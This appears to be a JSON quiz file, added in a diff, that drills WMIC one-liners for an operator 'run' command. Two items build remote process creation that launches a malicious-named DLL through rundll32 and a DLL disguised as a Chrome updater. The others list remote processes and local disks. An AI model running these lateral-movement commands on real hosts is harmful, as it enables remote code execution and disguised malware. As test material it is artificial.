@@ -1,0 +1,35 @@
+﻿[
+    {
+        "question":  [
+                         "Use \"run\" to create a WMIC onelier with the following options.",
+                         "remote IP = <IP>",
+                         "Command = powershell.exe -c c:\\windows\\system32\\rundll32.exe c:\\windows\\system32\\evil.dll",
+                         "DLL Start Point = fakeW"
+                     ],
+        "answer":  "run wmic /node:<IP> process call create \"powershell.exe -c c:\\windows\\system32\\rundll32.exe c:\\windows\\system32\\evil.dll fakeW\""
+    },
+    {
+        "question":  [
+                         "Use \"run\" to create a WMIC onelier with the following options.",
+                         "remote IP = <IP>",
+                         "Command = powershell.exe -c c:\\programdata\\ChromeUpdater.exe c:\\windows\\system32\\ChromeUpdater.dll",
+                         "DLL Start Point = ProbablyLegit"
+                     ],
+        "answer":  "run wmic /node:<IP> process call create \"powershell.exe -c c:\\programdata\\ChromeUpdater.exe c:\\windows\\system32\\ChromeUpdater.dll ProbablyLegit\""
+    },
+    {
+        "question":  [
+                         "Use run and WMIC to list process name and processid on a remote host.",
+                         "Remote IP = <IP>"
+                     ],
+        "answer":  "run wmic /node:<IP> process get name,processid"
+    },
+    {
+        "question":  [
+                         "Use run and WMIC to list local logical disks with free space.",
+                         "Output fields = caption,freespace,size"
+                     ],
+        "answer":  "run wmic logicaldisk get caption,freespace,size"
+    }
+]
+
